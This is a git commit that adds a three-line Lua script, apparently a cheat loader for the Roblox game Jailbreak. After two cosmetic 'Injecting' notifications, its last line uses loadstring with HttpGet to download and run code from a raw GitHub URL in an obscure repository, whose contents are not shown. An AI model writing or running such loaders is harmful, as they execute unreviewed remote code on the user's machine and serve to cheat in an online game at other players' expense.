bc959bce82967577316d7105524e289bd34aaf68
jerry-2009 <77391147+jerry-2009@users.noreply.github.com>
2022-04-04 19:27:20 +0800

    Create Jailbreak_Auto_Rob_Old.lua

---
+++ roblox_scripts/Jailbreak_Auto_Rob_Old.lua
@@ -0,0 +1,3 @@
+game.StarterGui:SetCore("SendNotification", {Title="Script"; Text="Injecting..."; Duration=1;})
+game.StarterGui:SetCore("SendNotification", {Title="Script"; Text="Inject Sussfully!"; Duration=1;})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))();
